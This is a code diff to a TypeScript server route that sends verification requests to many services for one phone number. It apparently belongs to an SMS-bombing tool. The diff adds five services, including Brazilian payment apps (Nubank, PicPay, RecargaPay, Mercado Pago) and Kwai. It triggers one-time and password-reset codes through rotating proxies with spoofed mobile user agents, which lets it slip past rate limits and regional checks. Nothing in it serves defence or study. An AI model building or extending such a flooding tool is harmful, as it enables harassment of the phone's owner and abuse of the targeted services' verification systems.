@@ -851,7 +851,7 @@ router.get("/stream/sendcode", async (req, res): Promise<void> => {
   }
 
   // Count services ahead of time for the start event
-  const SERVICE_COUNT = 17;
+  const SERVICE_COUNT = 22;
   emit({ type: "start", number: num.e164, services: SERVICE_COUNT });
 
   await Promise.allSettled([
@@ -972,6 +972,40 @@ router.get("/stream/sendcode", async (req, res): Promise<void> => {
     sseService("Amazon", [
       () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded", "-H", "User-Agent: Amazon/24.1.2.800 Android/14", "-H", "Accept: application/json", "--data-raw", `phoneNumber=${encodeURIComponent(num.e164)}&action=resend&requestId=${Math.random().toString(36).slice(2)}`, "https://www.amazon.com.br/ap/ajax/mfa/request_otp"], 12_000),
     ], r => r.statusCode === 200 && !r.body.toLowerCase().includes("error")),
+
+    // ── 18. Nubank Pix (chave Pix — requer IP brasileiro) ────────────────────
+    sseService("Nubank Pix", [
+      async () => {
+        const disc = await runCurl([...pickProxyArgs(), "-H", "User-Agent: nubank-android-24.0", "-H", "Accept: application/json", "https://prod-global-auth.nubank.com.br/api/discovery"], 10_000);
+        const links = JSON.parse(disc.body) as Record<string, string>;
+        const smsUrl = links["gen_certificate"] ?? links["revoke_token"] ?? "";
+        if (!smsUrl) return disc;
+        return runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-24.0", "--data-raw", JSON.stringify({ login: num.e164 }), smsUrl], 12_000);
+      },
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: nubank-android-24.0", "--data-raw", JSON.stringify({ phone_number: num.e164 }), "https://prod-s0-corona.nubank.com.br/api/login"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.includes('"error"')),
+
+    // ── 19. PicPay Pix (chave Pix — requer IP brasileiro) ────────────────────
+    sseService("PicPay Pix", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/22.1.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ phone: num.e164, channel: "sms" }), "https://api.picpay.com/v2/auth/phone-verification"], 12_000),
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: PicPay/22.1.0 Android", "--data-raw", JSON.stringify({ login: num.e164, type: "phone" }), "https://api.picpay.com/auth/v2/login"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes('"error"')),
+
+    // ── 20. RecargaPay (carteira digital — requer IP brasileiro) ─────────────
+    sseService("RecargaPay", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: RecargaPay/8.0 Android", "-H", "Accept: application/json", "--data-raw", JSON.stringify({ msisdn: num.e164, channel: "sms" }), "https://api.recargapay.com.br/v4/users/otp/request"], 12_000),
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: RecargaPay/8.0 Android", "--data-raw", JSON.stringify({ phone: num.subscriber, country_code: num.cc }), "https://api.recargapay.com.br/v3/user/login"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes('"code":"error"')),
+
+    // ── 21. Mercado Pago Pix (chave Pix) ─────────────────────────────────────
+    sseService("Mercado Pago", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: MercadoPago/2.239.0 Android", "-H", "X-Platform: mobile", "--data-raw", JSON.stringify({ phone: { area_code: num.ddd || "11", number: num.subscriber }, channel: "sms" }), "https://api.mercadopago.com/v1/beta/users/phone/otp?platform=mp"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && !r.body.toLowerCase().includes('"error"')),
+
+    // ── 22. Kwai Brasil 2 (alternativo) ──────────────────────────────────────
+    sseService("Kwai BR", [
+      () => runCurl([...pickProxyArgs(), "-X", "POST", "-H", "Content-Type: application/json", "-H", "User-Agent: Kwai/10.2.40.573147 Android", "--data-raw", JSON.stringify({ phoneNumber: num.e164, countryCode: `+${num.cc}`, action: "FORGOT_PWD", language: "pt" }), "https://rest.kwai.com/rest/n/mab/user/sendVerifyCode"], 12_000),
+    ], r => r.statusCode >= 200 && r.statusCode < 300 && r.body.length > 2 && !r.body.toLowerCase().includes('"error"')),
 
   ]);
 
